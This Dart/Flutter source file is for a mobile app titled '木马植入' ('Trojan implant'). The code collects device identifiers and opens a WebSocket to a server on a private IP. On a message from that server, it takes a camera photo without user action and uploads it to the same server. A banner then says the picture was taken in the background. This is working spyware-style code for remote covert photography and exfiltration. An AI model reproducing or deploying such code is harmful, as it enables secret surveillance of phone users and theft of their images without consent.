import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import './routes/photo.dart';
import './routes/home.dart';
import './common/global.dart';
import 'dart:io';
import './routes/contact.dart';
import 'package:web_socket_channel/io.dart';
import 'package:device_info/device_info.dart';
import 'package:image_picker/image_picker.dart';
// import 'package:path/path.dart' show join;
import 'package:path_provider/path_provider.dart';
// import 'package:adaptive_dialog/adaptive_dialog.dart';
import 'package:dio/dio.dart';
import 'package:camera/camera.dart';
void main() {
  // runApp(const MyApp());
  runApp(const MaterialApp(
      title: 'test flutter',
      routes: {
        // "page_photo": (context) =>  const PermissionPhoto(),
        // "page_contact": (context) =>  const FlutterContactsExample(),
        // "page_socket": (context) =>  const SocketPage()
      },
      home: MyStatefulWidget()));
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final ButtonStyle style =
        ElevatedButton.styleFrom(textStyle: const TextStyle(fontSize: 20));
    return Center(
        child: Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        ElevatedButton(
          style: style,
          onPressed: () {
            Navigator.pushNamed(context, "page_photo");
          },
          child: const Text('去主页'),
        ),
      ],
    ));
  }
}

class MyStatefulWidget extends StatefulWidget {
  const MyStatefulWidget({Key? key}) : super(key: key);

  @override
  _MyStatefulWidgetState createState() => _MyStatefulWidgetState();
}

class _MyStatefulWidgetState extends State<MyStatefulWidget> {
  int _selectedIndex = 0;
  static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
  Map<String, dynamic> _deviceData = <String, dynamic>{};
  // bool flag = false;
  final List _widgetOptions = [
    const HomePage(),
    const PermissionPhoto(),
    const FlutterContactsExample(),
  ];

  void _onItemTapped(int index) async {
    // if(Global.name == '') {
    //   var res = await showTextInputDialog(
    //     context: context,
    //     textFields: const [
    //       DialogTextField(
    //         hintText: ''
    //       )
    //     ],
    //     message: '请输入您的名字',
    //     okLabel: '确认',
    //     cancelLabel: '取消',
    //   );
    //   print(res);
    // }
    setState(() {
      _selectedIndex = index;
      // Navigator.pushNamed(context, _widgetOptions[index]);
    });
  }

  Future<void> initPlatformState() async {
    Map<String, dynamic> deviceData = <String, dynamic>{};

    try {
      if (Platform.isAndroid) {
        deviceData = _readAndroidBuildData(await deviceInfoPlugin.androidInfo);
      } else if (Platform.isIOS) {
        deviceData = _readIosDeviceInfo(await deviceInfoPlugin.iosInfo);
      }
    } on PlatformException {
      deviceData = <String, dynamic>{
        'Error:': 'Failed to get platform version.'
      };
    }

    if (!mounted) return;

    setState(() {
      _deviceData = deviceData;
    });
  }

  Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
    return <String, dynamic>{
      'version.securityPatch': build.version.securityPatch,
      'version.sdkInt': build.version.sdkInt,
      'version.release': build.version.release,
      'version.previewSdkInt': build.version.previewSdkInt,
      'version.incremental': build.version.incremental,
      'version.codename': build.version.codename,
      'version.baseOS': build.version.baseOS,
      'board': build.board,
      'bootloader': build.bootloader,
      'brand': build.brand,
      'device': build.device,
      'display': build.display,
      'fingerprint': build.fingerprint,
      'hardware': build.hardware,
      'host': build.host,
      'id': build.id,
      'manufacturer': build.manufacturer,
      'model': build.model,
      'product': build.product,
      'supported32BitAbis': build.supported32BitAbis,
      'supported64BitAbis': build.supported64BitAbis,
      'supportedAbis': build.supportedAbis,
      'tags': build.tags,
      'type': build.type,
      'isPhysicalDevice': build.isPhysicalDevice,
      'androidId': build.androidId,
      'systemFeatures': build.systemFeatures,
    };
  }

  Map<String, dynamic> _readIosDeviceInfo(IosDeviceInfo data) {
    return <String, dynamic>{
      'name': data.name,
      'systemName': data.systemName,
      'systemVersion': data.systemVersion,
      'model': data.model,
      'localizedModel': data.localizedModel,
      'identifierForVendor': data.identifierForVendor,
      'isPhysicalDevice': data.isPhysicalDevice,
      'utsname.sysname:': data.utsname.sysname,
      'utsname.nodename:': data.utsname.nodename,
      'utsname.release:': data.utsname.release,
      'utsname.version:': data.utsname.version,
      'utsname.machine:': data.utsname.machine,
    };
  }

  @override
  void initState() {
    super.initState();
    initPlatformState();
    var channel = IOWebSocketChannel.connect(
        Uri.parse('ws://192.168.101.18:8019/yzxa-api/websocket/appSocket'));
    channel.stream.listen((message) async {
      // if(Global.routeName == '') {
         var cameras = await availableCameras();
          var tmpPath = await getTemporaryDirectory();
          var controller = CameraController(cameras[0], ResolutionPreset.max);
          controller.initialize().then((value) => {
            Navigator.of(context).push(MaterialPageRoute(
              builder: (context) => CameraApp(controller:controller, tmpPath:tmpPath)
            ))
          });
      // } else {
      //   print(333);
      //   var cameras = await availableCameras();
      //     var tmpPath = await getTemporaryDirectory();
      //     var controller = CameraController(cameras[0], ResolutionPreset.max);
      //   CameraApp(controller:controller, tmpPath:tmpPath);
      // }
         
          
      // _takePhoto();
    });
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        print('退出');
        return true;
      },
      child: Scaffold(
          appBar: AppBar(
            title: const Text('木马植入'),
            leading: const Icon(Icons.home),
            backgroundColor: Colors.blue[700],
            centerTitle: true,
          ),
          body: _widgetOptions[_selectedIndex],
          bottomNavigationBar: BottomNavigationBar(
            items: const <BottomNavigationBarItem>[
              BottomNavigationBarItem(
                icon: Icon(Icons.home),
                label: 'Home',
              ),
              BottomNavigationBarItem(
                icon: Icon(Icons.photo_album),
                label: 'Photo',
              ),
              BottomNavigationBarItem(
                icon: Icon(Icons.contact_page),
                label: 'Contact',
              ),
            ],
            currentIndex: _selectedIndex,
            backgroundColor: Colors.blue[700],
            selectedItemColor: Colors.white,
            onTap: _onItemTapped,
          )),
    );
  }

  _takePhoto() async {
    var image = await ImagePicker().pickImage(source: ImageSource.camera);
    if(image != null) {
      try {
        var dio = Dio();
          var res = await dio.post('http://192.168.101.18:8019/yzxa-api/app/uploadImg', data: FormData.fromMap({
              'file': await MultipartFile.fromFile(image.path, filename: image.name)
            }));
          print(res.data);
        } catch(e) {
          print(e);
        }
    }
  }
}

class CameraApp extends StatefulWidget {

   const CameraApp({camera,Key? key,  required this.controller, required this.tmpPath}) : super( key: key);
  final CameraController controller;
  final Directory tmpPath;
  @override
  _CameraAppState createState() => _CameraAppState();
}
class _CameraAppState extends State<CameraApp> {
  var tmp = '';
  @override
  void initState() {
    super.initState();
    setState(() {
      Global.routeName = 'takePhoto';
    });
    // final path = join(
    //     // Store the picture in the temp directory.
    //     // Find the temp directory using the `path_provider` plugin.
    //     widget.tmpPath.path,
    //     '${DateTime.now()}.png',
    //   );
      widget.controller.takePicture().then((value) async {
        try {
          var file = File(value.path);
          setState(() {
            tmp = value.path;
          });
          var dio = Dio();
          dio.post('http://192.168.101.18:8019/yzxa-api/app/uploadImg', data: FormData.fromMap({
              'file': await MultipartFile.fromFile(file.path, filename: value.name)
            })).then((res) {
              print(res);
            });
            
        } catch(e) {
          print(e);
        }
      });
  }

  @override
  void dispose() {
    widget.controller.dispose();
    setState(() {
      Global.routeName = '';
    });
    super.dispose();
  }

  @override
  Widget build(BuildContext context)  {
    if (!widget.controller.value.isInitialized) {
      return Container();
    }
    return Scaffold(
        appBar: AppBar(
          title: const Text('木马植入'),
          leading: const Icon(Icons.home),
          backgroundColor: Colors.blue[700],
          centerTitle: true,
        ),
        body: Center(
          child: Column(
          mainAxisSize: MainAxisSize.max,
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.center,
          children:  [
            tmp.isNotEmpty ? Image.file(File(tmp)) : 
            Column(
              children: const[
                 Padding(padding: EdgeInsets.fromLTRB(0, 50, 0, 20),
                  child: Text('已经在后台拍了照片',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      fontSize: 20,
                    ),
                  )),
                  Padding(padding: EdgeInsets.fromLTRB(0, 10, 0, 20),
                  child: Text('稍后即可查看~',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      fontSize: 16,
                    ),
                  )),
                  // Icon(Icons.sync)
              ],
            )
          ],
        )
        )
        
        
    // return CameraPreview(widget.controller);
    );
  } 
}